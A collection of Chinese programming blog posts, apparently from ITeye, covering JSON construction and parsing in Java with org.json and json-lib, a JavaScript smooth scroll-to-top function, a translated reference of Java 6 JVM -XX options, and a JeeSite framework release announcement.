      在www.json.org上公布了很多JAVA下的json构造和解析工具，其中org.json和json-lib比较简单，两者使用上差不多但还是有些区别。下面接着介绍用org.json构造和解析Json数据的方法示例。       用json-lib构造和解析Json数据的方法详解请参见我上一篇博文：Java构造和解析Json数据的两种方法详解一   一、介绍 org.json包是另一个用来beans,collections,maps,java arrays 和XML和JSON互相转换的包，主要就是用来解析Json数据，在其官网http://www.json.org/上有详细讲解，有兴趣的可以去研究。 二、下载jar依赖包 http://www.json.org/ 由于org.json不能直接与bean进行转换，需要通过map进行中转，为了方便，我这里写了一个工具类JsonHelper，用于Json与Map、Bean的相互转换  package com.json; import java.lang.reflect.Method;import java.text.ParseException;import java.util.HashMap;import java.util.Iterator;import java.util.Map; import org.json.JSONException;import org.json.JSONObject; /** *  * 1:将JavaBean转换成Map、JSONObject * 2:将Map转换成Javabean * 3:将JSONObject转换成Map、Javabean *  * @author Alexia */ public class JsonHelper {        /**     * 将Javabean转换为Map     *      * @param javaBean     *            javaBean     * @return Map对象     */    public static Map toMap(Object javaBean) {         Map result = new HashMap();        Method[] methods = javaBean.getClass().getDeclaredMethods();         for (Method method : methods) {             try {                 if (method.getName().startsWith("get")) {                     String field = method.getName();                    field = field.substring(field.indexOf("get") + 3);                    field = field.toLowerCase().charAt(0) + field.substring(1);                     Object value = method.invoke(javaBean, (Object[]) null);                    result.put(field, null == value ? "" : value.toString());                 }             } catch (Exception e) {                e.printStackTrace();            }         }         return result;     }     /**     * 将Json对象转换成Map     *      * @param jsonObject     *            json对象     * @return Map对象     * @throws JSONException     */    public static Map toMap(String jsonString) throws JSONException {         JSONObject jsonObject = new JSONObject(jsonString);                Map result = new HashMap();        Iterator iterator = jsonObject.keys();        String key = null;        String value = null;                while (iterator.hasNext()) {             key = (String) iterator.next();            value = jsonObject.getString(key);            result.put(key, value);         }        return result;     }     /**     * 将JavaBean转换成JSONObject（通过Map中转）     *      * @param bean     *            javaBean     * @return json对象     */    public static JSONObject toJSON(Object bean) {         return new JSONObject(toMap(bean));     }     /**     * 将Map转换成Javabean     *      * @param javabean     *            javaBean     * @param data     *            Map数据     */    public static Object toJavaBean(Object javabean, Map data) {         Method[] methods = javabean.getClass().getDeclaredMethods();        for (Method method : methods) {             try {                if (method.getName().startsWith("set")) {                     String field = method.getName();                    field = field.substring(field.indexOf("set") + 3);                    field = field.toLowerCase().charAt(0) + field.substring(1);                    method.invoke(javabean, new Object[] {                     data.get(field)                     });                 }            } catch (Exception e) {            }         }         return javabean;     }     /**     * JSONObject到JavaBean     *      * @param bean     *            javaBean     * @return json对象     * @throws ParseException     *             json解析异常     * @throws JSONException     */    public static void toJavaBean(Object javabean, String jsonString)            throws ParseException, JSONException {         JSONObject jsonObject = new JSONObject(jsonString);            Map map = toMap(jsonObject.toString());                toJavaBean(javabean, map);     } }  package com.json; import java.text.ParseException;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map; import org.json.JSONArray;import org.json.JSONException;import org.json.JSONObject; /** * 使用json-lib构造和解析Json数据 *  * @author Alexia * @date 2013/5/23 *  */public class OrgJsonTest {     /**     * 构造Json数据     *      * @return     * @throws JSONException     */    public static String BuildJson() throws JSONException {         // JSON格式数据解析对象        JSONObject jo = new JSONObject();         // 下面构造两个map、一个list和一个Employee对象        Map<String, String> map1 = new HashMap<String, String>();        map1.put("name", "Alexia");        map1.put("sex", "female");        map1.put("age", "23");         Map<String, String> map2 = new HashMap<String, String>();        map2.put("name", "Edward");        map2.put("sex", "male");        map2.put("age", "24");         List<Map> list = new ArrayList<Map>();        list.add(map1);        list.add(map2);         Employee employee = new Employee();        employee.setName("wjl");        employee.setSex("female");        employee.setAge(24);         // 将Map转换为JSONArray数据        JSONArray ja = new JSONArray();        ja.put(map1);         System.out.println("JSONArray对象数据格式：");        System.out.println(ja.toString());         // 将Javabean转换为Json数据（需要Map中转）        JSONObject jo1 = JsonHelper.toJSON(employee);         System.out.println("\n仅含Employee对象的Json数据格式：");        System.out.println(jo1.toString());         // 构造Json数据，包括一个map和一个含Employee对象的Json数据        jo.put("map", ja);        jo.put("employee", jo1.toString());        System.out.println("\n最终构造的JSON数据格式：");        System.out.println(jo.toString());         return jo.toString();     }     /**     * 解析Json数据     *      * @param jsonString     *            Json数据字符串     * @throws JSONException     * @throws ParseException     */    public static void ParseJson(String jsonString) throws JSONException,            ParseException {         JSONObject jo = new JSONObject(jsonString);        JSONArray ja = jo.getJSONArray("map");         System.out.println("\n将Json数据解析为Map：");        System.out.println("name: " + ja.getJSONObject(0).getString("name")                + " sex: " + ja.getJSONObject(0).getString("sex") + " age: "                + ja.getJSONObject(0).getInt("age"));         String jsonStr = jo.getString("employee");        Employee emp = new Employee();        JsonHelper.toJavaBean(emp, jsonStr);         System.out.println("\n将Json数据解析为Employee对象：");        System.out.println("name: " + emp.getName() + " sex: " + emp.getSex()                + " age: " + emp.getAge());     }     /**     * @param args     * @throws JSONException     * @throws ParseException     */    public static void main(String[] args) throws JSONException, ParseException {        // TODO Auto-generated method stub         ParseJson(BuildJson());    } }
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
(转)Java构造和解析Json数据的两种方法详解一, jilongliang.iteye.com.blog.2051877, Tue, 22 Apr 2014 15:26:27 +0800

      在www.json.org上公布了很多JAVA下的json构造和解析工具，其中org.json和json-lib比较简单，两者使用上差不多但还是有些区别。下面首先介绍用json-lib构造和解析Json数据的方法示例。
      用org.son构造和解析Json数据的方法详解请参见我下一篇博文：Java构造和解析Json数据的两种方法详解二
一、介绍
      JSON-lib包是一个beans,collections,maps,java arrays 和XML和JSON互相转换的包，主要就是用来解析Json数据，在其官网http://www.json.org/上有详细讲解，有兴趣的可以去研究。
二、下载jar依赖包：可以去这里下载
三、基本方法介绍
1. List集合转换成json方法
 
List list = new ArrayList();
list.add( "first" );
list.add( "second" );
JSONArray jsonArray2 = JSONArray.fromObject( list );
 
2. Map集合转换成json方法
Map map = new HashMap();
map.put("name", "json");
map.put("bool", Boolean.TRUE);
map.put("int", new Integer(1));
map.put("arr", new String[] { "a", "b" });
map.put("func", "function(i){ return this.arr[i]; }");
JSONObject json = JSONObject.fromObject(map);
3. Bean转换成json代码
JSONObject jsonObject = JSONObject.fromObject(new JsonBean());
4. 数组转换成json代码
boolean[] boolArray = new boolean[] { true, false, true };
JSONArray jsonArray1 = JSONArray.fromObject(boolArray);
5. 一般数据转换成json代码
JSONArray jsonArray3 = JSONArray.fromObject("['json','is','easy']" );
6. beans转换成json代码
List list = new ArrayList();
JsonBean2 jb1 = new JsonBean2();
jb1.setCol(1);
jb1.setRow(1);
jb1.setValue("xx");
JsonBean2 jb2 = new JsonBean2();
jb2.setCol(2);
jb2.setRow(2);
jb2.setValue("");
list.add(jb1);
list.add(jb2);
JSONArray ja = JSONArray.fromObject(list);
四、演示示例
这里以基本的几个常用方法进行测试
package com.json;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
/**
 * 使用json-lib构造和解析Json数据
 * 
 * @author Alexia
 * @date 2013/5/23
 *
 */
public class JsonTest {
    /**
     * 构造Json数据
     * 
     * @return
     */
    public static String BuildJson() {
        // JSON格式数据解析对象
        JSONObject jo = new JSONObject();
        // 下面构造两个map、一个list和一个Employee对象
        Map<String, String> map1 = new HashMap<String, String>();
        map1.put("name", "Alexia");
        map1.put("sex", "female");
        map1.put("age", "23");
        Map<String, String> map2 = new HashMap<String, String>();
        map2.put("name", "Edward");
        map2.put("sex", "male");
        map2.put("age", "24");
        List<Map> list = new ArrayList<Map>();
        list.add(map1);
        list.add(map2);
        Employee employee = new Employee();
        employee.setName("wjl");
        employee.setSex("female");
        employee.setAge(24);
        // 将Map转换为JSONArray数据
        JSONArray ja1 = JSONArray.fromObject(map1);
        // 将List转换为JSONArray数据
        JSONArray ja2 = JSONArray.fromObject(list);
        // 将Bean转换为JSONArray数据
        JSONArray ja3 = JSONArray.fromObject(employee);
        System.out.println("JSONArray对象数据格式：");
        System.out.println(ja1.toString());
        System.out.println(ja2.toString());
        System.out.println(ja3.toString());
        // 构造Json数据，包括一个map和一个Employee对象
        jo.put("map", ja1);
        jo.put("employee", ja2);
        System.out.println("\n最终构造的JSON数据格式：");
        System.out.println(jo.toString());
        return jo.toString();
    }
    /**
     * 解析Json数据
     * 
     * @param jsonString Json数据字符串
     */
    public static void ParseJson(String jsonString) {
        // 以employee为例解析，map类似
        JSONObject jb = JSONObject.fromObject(jsonString);
        JSONArray ja = jb.getJSONArray("employee");
        List<Employee> empList = new ArrayList<Employee>();
        // 循环添加Employee对象（可能有多个）
        for (int i = 0; i < ja.size(); i++) {
            Employee employee = new Employee();
            employee.setName(ja.getJSONObject(i).getString("name"));
            employee.setSex(ja.getJSONObject(i).getString("sex"));
            employee.setAge(ja.getJSONObject(i).getInt("age"));
            empList.add(employee);
        }
        System.out.println("\n将Json数据转换为Employee对象：");
        for (int i = 0; i < empList.size(); i++) {
            Employee emp = empList.get(i);
            System.out.println("name: " + emp.getName() + " sex: "
                    + emp.getSex() + " age: " + emp.getAge());
        }
    }
    /**
     * @param args
     */
    public static void main(String[] args) {
        // TODO Auto-generated method stub
        ParseJson(BuildJson());
    }
}
运行结果如下
五、与org.json比较
      json-lib和org.json的使用几乎是相同的，我总结出的区别有两点：
      1. org.json比json-lib要轻量得多，前者没有依赖任何其他jar包，而后者要依赖ezmorph和commons的lang、logging、beanutils、collections等组件
      2. json-lib在构造bean和解析bean时比org.json要方便的多，json-lib可直接与bean互相转换，而org.json不能直接与bean相互转换而需要map作为中转，若将bean转为json数据，首先需要先将bean转换为map再将map转为json，比较麻烦。
      总之，还是那句话—适合自己的才是最好的，大家要按需选取使用哪种方法进行解析。最后给大家介绍两款解析Json数据的工具：一是在线工具JSON Edit（http://braincast.nl/samples/jsoneditor/）；另一个是Eclipse的插件JSON Tree Analyzer，都很好用，推荐给大家使用！           
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
VisualSVN server搭建安装和指定IP或域名, jilongliang.iteye.com.blog.2051337, Mon, 21 Apr 2014 15:44:14 +0800

安装请请参考  VisualSVN server搭建安装
 
  
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
用 JavaScript 实现变速回到顶部, jilongliang.iteye.com.blog.2050175, Sun, 20 Apr 2014 20:32:21 +0800

一般网页的下方都会放置一个置顶按钮, 尤其是页面底部没有导航的网页, 这样可以帮助访客重新找到导航或者重温一遍广告 (想得真美). 随着近几年来 JavaScript 的应用日渐广泛, 滑动效果无处不在, 于是我也跟跟风, 将置顶功能做成了滑动效果. 后来为了更贴合物理特征, 改造做成了减速的滑动效果.
首先说一下原理吧. 我们会获取滚动条到页面顶部的距离, 然后上移一定的距离; 再获取滚动条到页面顶部的距离, 上移一定的距离 (比上一次小一点); ...
 
JavaScript 代码:
/**
 * 回到页面顶部
 * @param acceleration 加速度
 * @param time 时间间隔 (毫秒)
 **/
function goTop(acceleration, time) {
	acceleration = acceleration || 0.1;
	time = time || 16;
 
	var x1 = 0;
	var y1 = 0;
	var x2 = 0;
	var y2 = 0;
	var x3 = 0;
	var y3 = 0;
 
	if (document.documentElement) {
		x1 = document.documentElement.scrollLeft || 0;
		y1 = document.documentElement.scrollTop || 0;
	}
	if (document.body) {
		x2 = document.body.scrollLeft || 0;
		y2 = document.body.scrollTop || 0;
	}
	var x3 = window.scrollX || 0;
	var y3 = window.scrollY || 0;
 
	// 滚动条到页面顶部的水平距离
	var x = Math.max(x1, Math.max(x2, x3));
	// 滚动条到页面顶部的垂直距离
	var y = Math.max(y1, Math.max(y2, y3));
 
	// 滚动距离 = 目前距离 / 速度, 因为距离原来越小, 速度是大于 1 的数, 所以滚动距离会越来越小
	var speed = 1 + acceleration;
	window.scrollTo(Math.floor(x / speed), Math.floor(y / speed));
 
	// 如果距离不为零, 继续调用迭代本函数
	if(x > 0 || y > 0) {
		var invokeFunction = "goTop(" + acceleration + ", " + time + ")";
		window.setTimeout(invokeFunction, time);
	}
}
document.documentElement.scrollTop, document.body.scrollTop, window.scrollY 其实都是一样的, 但它们只在某些浏览器中起作用. 至于那哪个在哪些浏览器起作用可以自己调试一下.
HTML 代码:
<a href="#" onclick="goTop();return false;">TOP</a>
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 6 JVM参数选项大全（中文版）, thinkgem.iteye.com.blog.1986935, Mon, 09 Dec 2013 09:57:26 +0800

作者：Ken Wu
Email: ken.wug@gmail.com
转载本文档请注明原文链接 http://kenwublog.com/docs/java6-jvm-options-chinese-edition.htm！
 
本文是基于最新的SUN官方文档Java SE 6 Hotspot VM Options 编写的译文。主要介绍JVM中的非稳态选项及其使用说明。
为了让读者明白每个选项的含义，作者在原文基础上补充了大量的资料。希望这份文档，对正在研究JVM参数的朋友有帮助！
 
另外，考虑到本文档是初稿，如有描述错误，敬请指正。
 
非稳态选项使用说明
-XX:+<option> 启用选项
-XX:-<option> 不启用选项
-XX:<option>=<number> 给选项设置一个数字类型值，可跟单位，例如 32k, 1024m, 2g-XX:<option>=<string> 给选项设置一个字符串值，例如-XX:HeapDumpPath=./dump.core
 
行为选项
选项
默认值与限制
描述
-XX:-AllowUserSignalHandlers
限于Linux和Solaris，默认不启用
允许为java进程安装信号处理器。
Java信号处理相关知识，详见 http://kenwublog.com/java-asynchronous-notify-based-on-signal
-XX:-DisableExplicitGC
默认不启用
禁止在运行期显式地调用 System.gc()。
 
开启该选项后，GC的触发时机将由Garbage Collector全权掌控。注意：你熟悉的代码里没调用System.gc()，不代表你依赖的框架工具没在使用。
例如RMI就在多数用户毫不知情的情况下，显示地调用GC来防止自身OOM。
请仔细权衡禁用带来的影响。
-XX:-RelaxAccessControlCheck
默认不启用
在Class校验器中，放松对访问控制的检查。
 
作用与reflection里的setAccessible类似。
-XX:-UseConcMarkSweepGC
默认不启用
启用CMS低停顿垃圾收集器。
 
资料详见：http://kenwublog.com/docs/CMS_GC.pdf
-XX:-UseParallelGC
-server时启用
其他情况下，默认不启用
策略为新生代使用并行清除，年老代使用单线程Mark-Sweep-Compact的垃圾收集器。
-XX:-UseParallelOldGC
默认不启用
策略为老年代和新生代都使用并行清除的垃圾收集器。
-XX:-UseSerialGC
-client时启用
其他情况下，默认不启用
使用串行垃圾收集器。
-XX:+UseSplitVerifier
java5默认不启用
java6默认启用
使用新的Class类型校验器 。
新Class类型校验器有什么特点？新Class类型校验器，将老的校验步骤拆分成了两步：1，类型推断。2，类型校验。新类型校验器通过在javac编译时嵌入类型信息到bytecode中，省略了类型推断这一步，从而提升了classloader的性能。
 
Classload顺序（供参考）load -> verify -> prepare -> resove -> init
关联选项：-XX:+FailOverToOldVerifier
-XX:+FailOverToOldVerifier
Java6新引入选项，默认启用
如果新的Class校验器检查失败，则使用老的校验器。
 
为什么会失败？
因为JDK6最高向下兼容到JDK1.2，而JDK1.2的class info 与JDK6的info存在较大的差异，所以新校验器可能会出现校验失败的情况。
关联选项：-XX:+UseSplitVerifier
-XX:+HandlePromotionFailure    
java5以前是默认不启用，java6默认启用
关闭新生代收集担保。
什么是新生代收集担保？在一次理想化的minor gc中，Eden和First Survivor中的活跃对象会被复制到Second Survivor。然而，Second Survivor不一定能容纳下所有从E和F区copy过来的活跃对象。
为了确保minor gc能够顺利完成，GC需要在年老代中额外保留一块足以容纳所有活跃对象的内存空间。这个预留操作，就被称之为新生代收集担保（New Generation Guarantee）。如果预留操作无法完成时，仍会触发major gc(full gc)。为什么要关闭新生代收集担保？因为在年老代中预留的空间大小，是无法精确计算的。
为了确保极端情况的发生，GC参考了最坏情况下的新生代内存占用，即Eden+First Survivor。
这种策略无疑是在浪费年老代内存，从时序角度看，还会提前触发Full GC。
为了避免如上情况的发生，JVM允许开发者手动关闭新生代收集担保。
 
在开启本选项后，minor gc将不再提供新生代收集担保，而是在出现survior或年老代不够用时，抛出promotion failed异常。
-XX:+UseSpinning
java1.4.2和1.5需要手动启用, java6默认已启用
启用多线程自旋锁优化。
自旋锁优化原理
大家知道，Java的多线程安全是基于Lock机制实现的，而Lock的性能往往不如人意。原因是，monitorenter与monitorexit这两个控制多线程同步的bytecode原语，是JVM依赖操作系统互斥(mutex)来实现的。互斥是一种会导致线程挂起，并在较短的时间内又必须重新调度回原线程的，较为消耗资源的操作。
为了避免进入OS互斥，Java6的开发者们提出了自旋锁优化。
 
自旋锁优化的原理是在线程进入OS互斥前，通过CAS自旋一定的次数来检测锁的释放。
如果在自旋次数未达到预设值前锁已被释放，则当前线程会立即持有该锁。
 
CAS检测锁的原理详见: http://kenwublog.com/theory-of-lightweight-locking-upon-cas
关联选项：-XX:PreBlockSpin=10
-XX:PreBlockSpin=10
-XX:+UseSpinning必须先启用，对于java6来说已经默认启用了，这里默认自旋10次
控制多线程自旋锁优化的自旋次数。(什么是自旋锁优化？见 -XX:+UseSpinning 处的描述)
关联选项：-XX:+UseSpinning
-XX:+ScavengeBeforeFullGC    
默认启用
在Full GC前触发一次Minor GC。
-XX:+UseGCOverheadLimit
默认启用
限制GC的运行时间。如果GC耗时过长，就抛OOM。
-XX:+UseTLAB
1.4.2以前和使用-client选项时，默认不启用，其余版本默认启用
启用线程本地缓存区（Thread Local）。
-XX:+UseThreadPriorities
默认启用
使用本地线程的优先级。
-XX:+UseAltSigs
限于Solaris，默认启用
为了防止与其他发送信号的应用程序冲突，允许使用候补信号替代 SIGUSR1和SIGUSR2。
-XX:+UseBoundThreads
限于Solaris, 默认启用
绑定所有的用户线程到内核线程。减少线程进入饥饿状态（得不到任何cpu time）的次数。
-XX:+UseLWPSynchronization
限于solaris，默认启用
使用轻量级进程（内核线程）替换线程同步。
-XX:+MaxFDLimit
限于Solaris，默认启用
设置java进程可用文件描述符为操作系统允许的最大值。
-XX:+UseVMInterruptibleIO
限于solaris，默认启用
在solaris中，允许运行时中断线程 。
 
性能选项
 
选项与默认值
默认值与限制
描述
-XX:+AggressiveOpts
JDK 5 update 6后引入，但需要手动启用。
JDK6默认启用。
启用JVM开发团队最新的调优成果。例如编译优化，偏向锁，并行年老代收集等。
-XX:CompileThreshold=10000
1000
通过JIT编译器，将方法编译成机器码的触发阀值，可以理解为调用方法的次数，例如调1000次，将方法编译为机器码。
-XX:LargePageSizeInBytes=4m
默认4m
amd64位：2m
设置堆内存的内存页大小。
 
调整内存页的方法和性能提升原理，详见 http://kenwublog.com/tune-large-page-for-jvm-optimization
-XX:MaxHeapFreeRatio=70
70
GC后，如果发现空闲堆内存占到整个预估上限值的70%，则收缩预估上限值。
 
什么是预估上限值？
JVM在启动时，会申请最大值（-Xmx指定的数值）的地址空间，但其中绝大部分空间不会被立即分配(virtual)。
它们会一直保留着，直到运行过程中，JVM发现实际占用接近已分配上限值时，才从virtual里再分配掉一部分内存。
这里提到的已分配上限值，也可以叫做预估上限值。
引入预估上限值的好处是，可以有效地控制堆的大小。堆越小，GC效率越高嘛。
注意：预估上限值的大小一定小于或等于最大值。
-XX:MaxNewSize=size
1.3.1 Sparc: 32m
1.3.1 x86: 2.5m
新生代占整个堆内存的最大值。
-XX:MaxPermSize=64m
5.0以后: 64 bit VMs会增大预设值的30%
1.4 amd64: 96m
1.3.1 -client: 32m
 
其他默认 64m
Perm（俗称方法区）占整个堆内存的最大值。
-XX:MinHeapFreeRatio=40
40
GC后，如果发现空闲堆内存占到整个预估上限值的40%，则增大上限值。
(什么是预估上限值？见 -XX:MaxHeapFreeRatio 处的描述)
 
关联选项：
-XX:MaxHeapFreeRatio=70
-XX:NewRatio=2
Sparc -client: 8
x86 -server: 8
x86 -client: 12
-client: 4 (1.3)
8 (1.3.1+)
x86: 12
 
其他默认 2
新生代和年老代的堆内存占用比例。
例如2例如2表示新生代占年老代的1/2，占整个堆内存的1/3。
-XX:NewSize=2.125m
5.0以后: 64 bit Vms会增大预设值的30%
x86: 1m
x86, 5.0以后: 640k
 
其他默认 2.125m
新生代预估上限的默认值。(什么是预估上限值？见 -XX:MaxHeapFreeRatio 处的描述)
-XX:ReservedCodeCacheSize=32m    
Solaris 64-bit, amd64, -server x86: 48m
1.5.0_06之前, Solaris 64-bit amd64: 1024m
 
其他默认 32m
设置代码缓存的最大值，编译时用。
-XX:SurvivorRatio=8
Solaris amd64: 6
Sparc in 1.3.1: 25
Solaris platforms5.0以前: 32
 
其他默认 8
Eden与Survivor的占用比例。例如8表示，一个survivor区占用 1/8 的Eden内存，即1/10的新生代内存，为什么不是1/9？
因为我们的新生代有2个survivor，即S1和S22。所以survivor总共是占用新生代内存的 2/10，Eden与新生代的占比则为 8/10。
-XX:TargetSurvivorRatio=50
50
实际使用的survivor空间大小占比。默认是50%，最高90%。
-XX:ThreadStackSize=512
Sparc: 512
Solaris x86: 320(5.0以前 256)
Sparc 64 bit: 1024
Linux amd64: 1024 (5.0 以前 0)
 
其他默认 512.
线程堆栈大小
-XX:+UseBiasedLocking
JDK 5 update 6后引入，但需要手动启用。
JDK6默认启用。
启用偏向锁。
 
偏向锁原理详见 http://kenwublog.com/theory-of-java-biased-locking
-XX:+UseFastAccessorMethods
默认启用
优化原始类型的getter方法性能。
-XX:-UseISM
默认启用
启用solaris的ISM。
 
详见Intimate Shared Memory.
-XX:+UseLargePages
JDK 5 update 5后引入，但需要手动启用。
JDK6默认启用。
启用大内存分页。
 
调整内存页的方法和性能提升原理，详见http://kenwublog.com/tune-large-page-for-jvm-optimization
 
关联选项
-XX:LargePageSizeInBytes=4m
-XX:+UseMPSS
1.4.1 之前: 不启用
其余版本默认启用
启用solaris的MPSS，不能与ISM同时使用。
-XX:+StringCache
默认启用
启用字符串缓存。
-XX:AllocatePrefetchLines=1
1
与机器码指令预读相关的一个选项，资料比较少，本文档不做解释。有兴趣的朋友请自行阅读官方doc。
-XX:AllocatePrefetchStyle=1
1
与机器码指令预读相关的一个选项，资料比较少，本文档不做解释。有兴趣的朋友请自行阅读官方doc。
 
调试选项
 
选项与默认值
默认值与限制
描述
-XX:-CITime
1.4引入。
默认启用
打印JIT编译器编译耗时。
-XX:ErrorFile=./hs_err_pid<pid>.log
Java 6引入。
如果JVM crashed，将错误日志输出到指定文件路径。
-XX:-ExtendedDTraceProbes
Java6引入，限于solaris
默认不启用
启用dtrace诊断。
-XX:HeapDumpPath=./java_pid<pid>.hprof    
默认是java进程启动位置，即user.dir
堆内存快照的存储文件路径。
 
什么是堆内存快照？
当java进程因OOM或crash被OS强制终止后，会生成一个hprof（Heap PROFling）格式的堆内存快照文件。该文件用于线下调试，诊断，查找问题。
文件名一般为
java_<pid>_<date>_<time>_heapDump.hprof
解析快照文件，可以使用 jhat, eclipse MAT，gdb等工具。
-XX:-HeapDumpOnOutOfMemoryError
1.4.2 update12 和5.0 update 7 引入。
默认不启用
在OOM时，输出一个dump.core文件，记录当时的堆内存快照（什么是堆内存快照? 见 -XX:HeapDumpPath 处的描述）。
-XX:OnError="<cmd args>;<cmd args>"
1.4.2 update 9引入
当java每抛出一个ERROR时，运行指定命令行指令集。指令集是与OS环境相关的，在linux下多数是bash脚本，windows下是dos批处理。
-XX:OnOutOfMemoryError="<cmd args>;<cmd args>"
1.4.2 update 12和java6时引入
当第一次发生OOM时，运行指定命令行指令集。指令集是与OS环境相关的，在linux下多数是bash脚本，windows下是dos批处理。
-XX:-PrintClassHistogram
默认不启用
在Windows下, 按ctrl-break或Linux下是执行kill -3（发送SIGQUIT信号）时，打印class柱状图。
 
Jmap –histo pid也实现了相同的功能。
详见 http://java.sun.com/javase/6/docs/technotes/tools/share/jmap.html
-XX:-PrintConcurrentLocks
默认不启用
在thread dump的同时，打印java.util.concurrent的锁状态。
 
Jstack –l pid 也同样实现了同样的功能。
详见 http://java.sun.com/javase/6/docs/technotes/tools/share/jstack.html
-XX:-PrintCommandLineFlags
5.0 引入，默认不启用
Java启动时，往stdout打印当前启用的非稳态jvm options。
 
例如：
-XX:+UseConcMarkSweepGC -XX:+HeapDumpOnOutOfMemoryError -XX:+DoEscapeAnalysis
-XX:-PrintCompilation
默认不启用
往stdout打印方法被JIT编译时的信息。
 
例如：
1       java.lang.String::charAt (33 bytes)
-XX:-PrintGC
默认不启用
开启GC日志打印。
 
打印格式例如：
[Full GC 131115K->7482K(1015808K), 0.1633180 secs]
 
该选项可通过 com.sun.management.HotSpotDiagnosticMXBean API 和 Jconsole 动态启用。
详见 http://java.sun.com/developer/technicalArticles/J2SE/monitoring/#Heap_Dump
-XX:-PrintGCDetails
1.4.0引入，默认不启用
打印GC回收的细节。
 
打印格式例如：
[Full GC (System) [Tenured: 0K->2394K(466048K), 0.0624140 secs] 30822K->2394K(518464K), [Perm : 10443K->10443K(16384K)], 0.0625410 secs] [Times: user=0.05 sys=0.01, real=0.06 secs]
 
该选项可通过 com.sun.management.HotSpotDiagnosticMXBean API 和 Jconsole 动态启用。
详见 http://java.sun.com/developer/technicalArticles/J2SE/monitoring/#Heap_Dump
-XX:-PrintGCTimeStamps
默认不启用
打印GC停顿耗时。
 
打印格式例如：
2.744: [Full GC (System) 2.744: [Tenured: 0K->2441K(466048K), 0.0598400 secs] 31754K->2441K(518464K), [Perm : 10717K->10717K(16384K)], 0.0599570 secs] [Times: user=0.06 sys=0.00, real=0.06
secs]
 
该选项可通过 com.sun.management.HotSpotDiagnosticMXBean API 和 Jconsole 动态启用。
详见 http://java.sun.com/developer/technicalArticles/J2SE/monitoring/#Heap_Dump
-XX:-PrintTenuringDistribution
默认不启用
打印对象的存活期限信息。
 
打印格式例如：
[GCDesired survivor size 4653056 bytes, new threshold 32 (max 32)- age 1: 2330640 bytes, 2330640 total- age 2: 9520 bytes, 2340160 total
204009K->21850K(515200K), 0.1563482 secs]
 
Age1 2表示在第1和2次GC后存活的对象大小。
-XX:-TraceClassLoading
默认不启用
打印class装载信息到stdout。记Loaded状态。
 
例如：
[Loaded java.lang.Object from /opt/taobao/install/jdk1.6.0_07/jre/lib/rt.jar]
-XX:-TraceClassLoadingPreorder
1.4.2引入，默认不启用
按class的引用/依赖顺序打印类装载信息到stdout。不同于 TraceClassLoading，本选项只记 Loading状态。
 
例如：
[Loading java.lang.Object from /home/confsrv/jdk1.6.0_14/jre/lib/rt.jar]
-XX:-TraceClassResolution
1.4.2引入，默认不启用
打印所有静态类，常量的代码引用位置。用于debug。
 
例如：
RESOLVE java.util.HashMap java.util.HashMap$Entry HashMap.java:209
 
说明HashMap类的209行引用了静态类 java.util.HashMap$Entry
-XX:-TraceClassUnloading
默认不启用
打印class的卸载信息到stdout。记Unloaded状态。
-XX:-TraceLoaderConstraints
Java6 引入，默认不启用
打印class的装载策略变化信息到stdout。
 
例如：
[Adding new constraint for name: java/lang/String, loader[0]: sun/misc/Launcher$ExtClassLoader, loader[1]: <bootloader> ]
[Setting class object in existing constraint for name: [Ljava/lang/Object; and loader sun/misc/Launcher$ExtClassLoader ]
[Updating constraint for name org/xml/sax/InputSource, loader <bootloader>, by setting class object ]
[Extending constraint for name java/lang/Object by adding loader[15]: sun/reflect/DelegatingClassLoader  ]
 
装载策略变化是实现classloader隔离/名称空间一致性的关键技术。
对此感兴趣的朋友，详见 http://kenwublog.com/docs/Dynamic+Class+Loading+in+the+Java+Virtual+Machine.pdf 中的contraint rules一章。
-XX:+PerfSaveDataToFile
默认启用
当java进程因OOM或crashed被强制终止后，生成一个堆快照文件（什么是堆内存快照? 见 -XX:HeapDumpPath 处的描述）。
 
作者敬告
完善的单元测试，功能回归测试，和性能基准测试可以减少因调整非稳态JVM选项带来的风险。
 
参考资料
Java6性能调优白皮书
http://java.sun.com/performance/reference/whitepapers/6_performance.html
Java6 GC调优指南
http://java.sun.com/javase/technologies/hotspot/gc/gc_tuning_6.html
更为全面的options列表
http://blogs.sun.com/watt/resource/jvm-options-list.html
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite 企业信息管理系统基础框架 V1.0.3 发布, thinkgem.iteye.com.blog.1881520, Mon, 03 Jun 2013 14:35:16 +0800

框架简介：
 
JeeSite是一个 开源的企业信息管理系统 基础框架。主要定位于“企业信息管理”领域，可用作企业信息管理类系统、网站后台管理类系统等。JeeSite是非常强调开发的高效性、健壮性和安全性的。
 
JeeSite是轻量级的，简单易学，本框架以Spring Framework为核心、Spring MVC作为模型视图控制器、Spring Data JPA + Hibernate作为数据库操作层，此组合是Java界业内最经典、最优的搭配组合。前端界面风格采用了结构简单、性能优良、页面精致的Twitter Bootstrap作为前端展示框架。
 
JeeSite 已内置 一系列企业信息管理系统的基础功能，目前包括三大模块，系统管理（SYS）模块、内容管理（CMS）模块和在线办公（OA）模块。 系统管理模块，包括企业组织架构（用户管理、机构管理、区域管理）、菜单管理、角色权限管理、字典管理等功能；内容管理模块，包括内容管理（文章、链接），栏目管理、站点管理、公共留言、文件管理、前端网站展示等功能；在线办公模块，提供简单的请假流程实例。
 
JeeSite提供了常用工具进行封装，包括日志工具、缓存工具、服务器端验证、数据字典、当前组织机构数据（用户、机构、区域）以及其它常用小工具等。另外还提供一个基于本基础框架的 代码生成器 ，为你生成基本模块代码，如果你使用了JeeSite基础框架，就可以很快速开发出优秀的信息管理系统。
 
官方网站：http://jeesite.com/
 
在线演示：http://demo.jeesite.com:1234/jeesite
 
重要更新：
 
界面改版优化，紧凑风格，充分利用可视化空间。
登录3次错误后，输入验证码。
增加DataEntity数据实体，自动填写：创建者、创建时间、更新者、更新时间信息。
新增数据集权限控制，七种数据权限控制类型共你选择。
